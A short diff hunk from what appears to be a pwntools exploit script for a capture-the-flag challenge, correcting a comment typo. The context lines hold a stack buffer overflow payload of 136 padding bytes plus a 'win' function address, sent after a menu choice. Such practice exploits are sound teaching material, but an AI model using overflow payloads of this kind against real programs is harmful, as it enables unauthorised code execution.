@@ -11,7 +11,7 @@ option = b'2\n'
 p.sendlineafter("purpose: \n", b'2')
 
 
-# send payload after sendting option
+# send payload after sending option
 payload = b'A' * 136  
 payload += win        
 p.sendafter("know? \n", payload)
